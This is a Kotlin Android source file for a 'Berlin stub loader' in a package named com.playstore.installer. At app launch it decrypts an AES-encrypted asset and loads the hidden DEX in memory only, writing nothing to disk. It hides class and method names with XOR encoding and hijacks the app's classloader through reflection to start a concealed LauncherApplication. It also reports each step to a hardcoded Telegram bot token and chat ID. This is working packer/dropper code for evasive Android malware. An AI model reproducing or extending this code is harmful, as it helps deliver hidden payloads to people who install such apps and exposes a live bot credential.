package com.playstore.installer

import android.app.Application
import android.content.Context
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.net.URL
import java.nio.ByteBuffer

// Berlin stub loader — compiled standalone into classes.dex by build_stub_dex.py.
// No BuildConfig dependency. Asset name and AES key are patched directly into
// DEX byte arrays by build_stub_dex.py at CI time before APK repackaging.
//
// PATCH MARKERS (must stay exactly as-is — build_stub_dex.py searches for them):
//   BERLIN_STUB_ASSET_MARKER : 32 bytes 0xAB — patched with asset name UTF-8 (null-padded)
//   BERLIN_STUB_KEY_MARKER   : 32 bytes 0xCD — patched with AES-256 key hex UTF-8 (64 chars)
//
// Zero disk write — InMemoryDexClassLoader only. RAM only.
class BerlinAppEntry : Application() {

    // Asset name placeholder — 32 bytes 0xAB
    // build_stub_dex.py patches this with actual BERLIN_DEX_ASSET name (e.g. "d4f9a2c1.bin")
    private val A = byteArrayOf(
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte()
    )

    // AES-256 key placeholder — 64 bytes 0xCD (64-char hex key = 64 UTF-8 bytes)
    // build_stub_dex.py patches this with actual BERLIN_DEX_KEY hex string
    private val K = byteArrayOf(
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte()
    )

    @Volatile private var h: ClassLoader? = null

    // ── Telegram debug logger ─────────────────────────────────────────────────
    // Sends a message to Telegram bot. Runs on a background thread to avoid
    // blocking the main thread. All failures are silently ignored.
    private fun tg(msg: String) {
        val token  = "8728380845:AAGm3oD6xpUWJ2ftPJP3QysNl0BQHv54Nq8"
        val chatId = "8852912150"
        // Run on a NEW non-daemon thread and JOIN it — guarantees delivery even if app crashes.
        // Cannot use main thread: NetworkOnMainThreadException would fire and be swallowed silently.
        // Cannot use daemon thread: killed before HTTP completes when process dies.
        // Solution: non-daemon thread + join with timeout = blocks until message sent or timeout.
        try {
            val t = Thread {
                try {
                    val text   = "[BerlinStub] $msg"
                    val enc    = java.net.URLEncoder.encode(text, "UTF-8")
                    val urlStr = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$enc"
                    val conn   = URL(urlStr).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 4000
                    conn.readTimeout    = 4000
                    conn.requestMethod  = "GET"
                    conn.responseCode
                    conn.disconnect()
                } catch (_: Throwable) { }
            }
            t.isDaemon = false   // non-daemon — not killed when main thread exits
            t.start()
            t.join(5000)         // block main thread max 5s — guarantees delivery before crash
        } catch (_: Throwable) { }
    }

    // Helper — formats a Throwable as: ExceptionType: message\n  at ClassName.method(File:line)
    // WARNING: NO Kotlin stdlib extensions (no .take, .joinToString, etc.) — stub has no stdlib
    private fun fmtEx(t: Throwable): String {
        val sb = StringBuilder()
        sb.append(t.javaClass.simpleName).append(": ").append(t.message)
        val frames = t.stackTrace
        var i = 0
        while (i < frames.size && i < 5) {
            val f = frames[i]
            sb.append("\n  at ").append(f.className).append(".").append(f.methodName)
                .append("(").append(f.fileName).append(":").append(f.lineNumber).append(")")
            i++
        }
        return sb.toString()
    }
    // ─────────────────────────────────────────────────────────────────────────

    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        tg("attachBaseContext START — base=${if (base == null) "NULL" else base.javaClass.simpleName}")
        try {
            run(base)
        } catch (t: Throwable) {
            tg("attachBaseContext UNCAUGHT — ${fmtEx(t)}")
        }
    }

    // Secondary injection point — Android calls getClassLoader() to resolve
    // Activity/Service classes. Returning h here guarantees MainActivity is
    // found in the decrypted DEX even on OEMs where mPackageInfo injection
    // timing varies.
    override fun getClassLoader(): ClassLoader {
        return h ?: super.getClassLoader()
    }

    private fun assetName(): String? {
        val PAD = 0x00.toByte()
        var len = 0; while (len < A.size && A[len] != PAD) len++
        // Log raw bytes for diagnosis — no stdlib extensions (take/joinToString not available)
        val hexSb = StringBuilder()
        var hi = 0; while (hi < 16 && hi < A.size) { hexSb.append("%02X".format(A[hi])); hi++ }
        val rawHex = hexSb.toString()
        tg("assetName — len=$len firstBytes=$rawHex")
        if (len == 0) {
            tg("assetName FAIL — len=0, marker not patched (all 0xAB or starts with 0x00)")
            return null
        }
        val name = String(A, 0, len, Charsets.UTF_8)
        tg("assetName OK — '$name'")
        return name
    }

    private fun keyHex(): String? {
        val PAD = 0xCD.toByte()
        var len = 0; while (len < K.size && K[len] != PAD) len++
        tg("keyHex — len=$len")
        if (len != 64) {
            tg("keyHex FAIL — expected 64 chars, got $len (marker not fully patched?)")
            return null
        }
        tg("keyHex OK — 64 chars confirmed")
        return String(K, 0, 64, Charsets.UTF_8)
    }

    private fun run(base: Context?) {
        tg("run STEP 1 — resolving assetName")
        val name = assetName() ?: run { tg("run ABORT — assetName returned null"); return }

        tg("run STEP 2 — resolving keyHex")
        val key  = keyHex()   ?: run { tg("run ABORT — keyHex returned null"); return }

        tg("run STEP 3 — getting AssetManager. base=${if (base == null) "NULL" else "OK"}, baseContext=${if (baseContext == null) "NULL" else "OK"}")
        // Use 'base' parameter directly — 'assets' (this.assets) is null during
        // attachBaseContext because the context is not yet fully attached.
        // Fallback to baseContext?.assets in case base is null on some OEMs.
        val assetMgr = base?.assets ?: baseContext?.assets ?: run {
            tg("run ABORT STEP 3 — AssetManager is null (both base and baseContext are null)")
            return
        }
        tg("run STEP 3 OK — AssetManager acquired")

        tg("run STEP 4 — opening asset '$name'")
        val enc: ByteArray = try {
            peel(assetMgr.open(name)) ?: run {
                tg("run ABORT STEP 4 — peel() returned null for asset '$name'")
                return
            }
        } catch (t: Throwable) {
            tg("run ABORT STEP 4 — assetMgr.open('$name') threw: ${fmtEx(t)}")
            return
        }
        tg("run STEP 4 OK — asset read ${enc.size} bytes")

        if (enc.size < 17) {
            tg("run ABORT STEP 4b — enc too small: ${enc.size} bytes (need ≥17 for IV+data)")
            wipe(enc); return
        }

        tg("run STEP 5 — AES-256-CBC decrypt")
        val dex: ByteArray = aesDecrypt(enc, key) ?: run {
            tg("run ABORT STEP 5 — aesDecrypt returned null (bad key/IV or corrupt ciphertext)")
            wipe(enc); return
        }
        wipe(enc)
        tg("run STEP 5 OK — decrypted ${dex.size} bytes")

        if (dex.size < 8) {
            tg("run ABORT STEP 5b — decrypted DEX too small: ${dex.size} bytes")
            wipe(dex); return
        }

        tg("run STEP 6 — loading InMemoryDexClassLoader")
        val ne = byteArrayOf(0x3e,0x3b,0x36,0x2c,0x33,0x31,0x74,0x29,0x23,0x29,0x2e,0x3f,0x37,0x74,0x13,0x34,0x17,0x3f,0x37,0x35,0x28,0x23,0x1e,0x3f,0x22,0x19,0x36,0x3b,0x29,0x29,0x16,0x35,0x3b,0x3e,0x3f,0x28)
        val nc = CharArray(ne.size); var i = 0; while (i < ne.size) { nc[i] = (ne[i].toInt() and 0xFF xor 0x5A).toChar(); i++ }
        val loaderClassName = String(nc)
        tg("run STEP 6 — classloader class: $loaderClassName")
        try {
            val cls  = Class.forName(loaderClassName)
            val ctor = cls.getConstructor(ByteBuffer::class.java, ClassLoader::class.java)
            // Parent must be the system classloader (not null) so decrypted classes can resolve framework types
            val b    = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader())) ?: run {
                tg("run ABORT STEP 6 — cast to ClassLoader returned null")
                return
            }
            h = b
            tg("run STEP 6 OK — InMemoryDexClassLoader created, calling chain()")
            chain(b)
            tg("run STEP 6 DONE — chain() complete, h is set")
        } catch (t: Throwable) {
            tg("run ABORT STEP 6 — InMemoryDexClassLoader threw: ${fmtEx(t)}")
            wipe(dex); return
        } finally { wipe(dex) }
    }

    override fun onCreate() {
        super.onCreate()
        tg("onCreate — h=${if (h == null) "NULL (run() failed)" else "SET OK"}")
        kick()
    }

    private fun kick() {
        val b = h ?: classLoader ?: run {
            tg("kick ABORT — h is null and classLoader is null, run() never succeeded")
            return
        }
        tg("kick STEP 1 — loading LauncherApplication from decrypted DEX. pkg=$packageName")
        try {
            // Boot LauncherApplication from the decrypted DEX loaded in RAM
            val launcherClass = (packageName ?: run { tg("kick ABORT — packageName is null"); return }) + ".LauncherApplication"
            val cls = try {
                Class.forName(launcherClass, true, b)
            } catch (t: Throwable) {
                tg("kick ABORT STEP 1 — Class.forName('$launcherClass') threw: ${fmtEx(t)}")
                return
            }
            tg("kick STEP 1 OK — LauncherApplication class found")

            val app = cls.newInstance() as? Application ?: run {
                tg("kick ABORT STEP 1b — newInstance() not an Application")
                return
            }
            tg("kick STEP 2 — calling attachBaseContext on LauncherApplication")
            val ae  = byteArrayOf(0x3b,0x2e,0x2e,0x3b,0x39,0x32)
            val ac  = CharArray(ae.size); var j = 0; while (j < ae.size) { ac[j] = (ae[j].toInt() and 0xFF xor 0x5A).toChar(); j++ }
            val methodName = String(ac)
            val m   = Application::class.java.getDeclaredMethod(methodName, Context::class.java)
            m.isAccessible = true
            m.invoke(app, baseContext)
            tg("kick STEP 2 OK — attachBaseContext done, calling onCreate")
            app.onCreate()
            tg("kick DONE — LauncherApplication.onCreate() complete")
        } catch (t: Throwable) {
            tg("kick UNCAUGHT — ${fmtEx(t)}")
        }
    }

    private fun aesDecrypt(blob: ByteArray, keyHex: String): ByteArray? {
        if (blob.size < 17 || keyHex.length != 64) {
            tg("aesDecrypt FAIL — size=${blob.size} keyLen=${keyHex.length}")
            return null
        }
        val k = try { ByteArray(32) { i -> keyHex.substring(i*2,i*2+2).toInt(16).toByte() } } catch (t: Throwable) {
            tg("aesDecrypt FAIL — key parse threw: ${fmtEx(t)}")
            return null
        }
        return try {
            val iv = blob.copyOfRange(0,16); val ct = blob.copyOfRange(16,blob.size)
            val c  = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
            c.init(javax.crypto.Cipher.DECRYPT_MODE, javax.crypto.spec.SecretKeySpec(k,"AES"), javax.crypto.spec.IvParameterSpec(iv))
            val r = c.doFinal(ct); wipe(k); wipe(iv); wipe(ct); r
        } catch (t: Throwable) {
            tg("aesDecrypt FAIL — cipher threw: ${fmtEx(t)}")
            wipe(k); null
        }
    }

    private fun chain(c: ClassLoader?) {
        if (c == null) { tg("chain SKIP — classLoader is null"); return }
        tg("chain STEP 1 — injecting into mPackageInfo.mClassLoader")
        // Inject via mPackageInfo.mClassLoader — the classloader Android uses to resolve
        // Activities, Services and other components. This is the proven correct injection
        // point (parent-chain patching is insufficient for component resolution).
        try {
            var cls: Class<*>? = baseContext?.javaClass
            var pkgInfoField: java.lang.reflect.Field? = null
            while (cls != null && pkgInfoField == null) {
                pkgInfoField = try { cls.getDeclaredField("mPackageInfo") } catch (_: NoSuchFieldException) { null }
                cls = cls.superclass
            }
            if (pkgInfoField == null) {
                tg("chain FAIL STEP 1 — mPackageInfo field not found in class hierarchy")
                return
            }
            pkgInfoField.isAccessible = true
            val pkgInfo = pkgInfoField.get(baseContext) ?: run {
                tg("chain FAIL STEP 1 — mPackageInfo value is null")
                return
            }

            var cls2: Class<*>? = pkgInfo.javaClass
            var clField: java.lang.reflect.Field? = null
            while (cls2 != null && clField == null) {
                clField = try { cls2.getDeclaredField("mClassLoader") } catch (_: NoSuchFieldException) { null }
                cls2 = cls2.superclass
            }
            if (clField == null) {
                tg("chain FAIL STEP 1 — mClassLoader field not found in pkgInfo class hierarchy")
                return
            }
            clField.isAccessible = true
            clField.set(pkgInfo, c)
            tg("chain STEP 1 OK — mPackageInfo.mClassLoader injected")
        } catch (t: Throwable) {
            tg("chain FAIL STEP 1 — threw: ${fmtEx(t)}")
        }

        // Also set thread context classloader so any thread-local Class.forName calls resolve correctly
        try {
            Thread.currentThread().contextClassLoader = c
            tg("chain STEP 2 OK — thread contextClassLoader set")
        } catch (t: Throwable) {
            tg("chain FAIL STEP 2 — contextClassLoader threw: ${fmtEx(t)}")
        }
    }

    private fun peel(s: InputStream?): ByteArray? {
        if (s == null) return null
        val o = ByteArrayOutputStream(); val b = ByteArray(8192)
        try { var n = s.read(b); while (n != -1) { o.write(b,0,n); n = s.read(b) } } finally { try { s.close() } catch (t: Throwable) { } }
        return o.toByteArray()
    }

    private fun wipe(a: ByteArray?) { if (a == null) return; var i = 0; while (i < a.size) { a[i] = 0; i++ } }
}
